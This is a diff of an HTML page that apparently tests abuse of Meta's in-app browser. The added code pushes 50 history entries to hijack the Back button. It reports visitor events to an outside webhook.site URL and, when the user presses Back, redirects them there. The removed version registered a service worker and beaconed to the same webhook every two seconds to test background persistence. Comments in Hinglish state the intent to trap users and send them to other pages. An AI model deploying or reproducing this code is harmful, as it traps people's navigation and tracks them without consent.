@@ -2,43 +2,46 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Persistence Lab</title>
+    <title>Meta Navigation Trap</title>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
+<body style="background:#000; color:#0f0; font-family:monospace; padding:20px; text-align:center;">
 
-    <h3>Meta Background Persistence Test</h3>
-    <button onclick="registerServiceWorker()" style="padding:10px; width:100%;">1. Register Service Worker</button>
-    <button onclick="pingContinuous()" style="padding:10px; width:100%; margin-top:10px;">2. Start Continuous Ping</button>
-
-    <p id="status">Status: Idle</p>
+    <h3>Meta Persistence Research</h3>
+    <p>Is page par 10 second ruko...</p>
+    <p id="timer">10</p>
+    
+    <div id="status" style="color:yellow;">Stacking History...</div>
 
     <script>
         const WEBHOOK = "https://webhook.site/7a9ce72c-38b6-4f91-a1b8-5bea8d85797d";
+        let count = 10;
 
-        function log(m) { document.getElementById('status').innerText = m; }
-
-        // 1. Service Worker Registration
-        async function registerServiceWorker() {
-            if ('serviceWorker' in navigator) {
-                try {
-                    // Ek basic worker register karo (ye aapke server pe sw.js hona chahiye)
-                    const reg = await navigator.serviceWorker.register('sw.js');
-                    log("Service Worker Registered!");
-                    fetch(WEBHOOK + "?sw=success");
-                } catch (e) {
-                    log("SW Failed: " + e.message);
-                }
-            } else {
-                log("Service Workers not supported in this IAB.");
+        // Timer to show engagement
+        const interval = setInterval(() => {
+            count--;
+            document.getElementById('timer').innerText = count;
+            if(count <= 0) {
+                clearInterval(interval);
+                document.getElementById('status').innerText = "Stack Ready. Now try to go BACK.";
+                logToWebhook("Stack_Ready");
             }
+        }, 1000);
+
+        // 1. History Stacking: User ke "Back" button ko hijack karna
+        // Hum history mein 50 baar apna hi URL push karenge
+        for (let i = 0; i < 50; i++) {
+            window.history.pushState({page: i}, "", window.location.href + "#step" + i);
         }
 
-        // 2. Continuous Ping (Check if it survives in background)
-        function pingContinuous() {
-            log("Pinging every 2 seconds...");
-            setInterval(() => {
-                fetch(WEBHOOK + "?status=alive&time=" + Date.now(), {mode: 'no-cors'});
-            }, 2000);
+        // 2. The Trap: Jab user Back dabayega, ye event trigger hoga
+        window.onpopstate = function(event) {
+            logToWebhook("Back_Button_Intercepted");
+            // User ko wapas apne page par ya kisi dusre sensitive page par bhejna
+            window.location.href = "https://webhook.site/7a9ce72c-38b6-4f91-a1b8-5bea8d85797d?trap=activated";
+        };
+
+        function logToWebhook(msg) {
+            fetch(WEBHOOK + "?event=" + msg, {mode: 'no-cors'});
         }
     </script>
 </body>
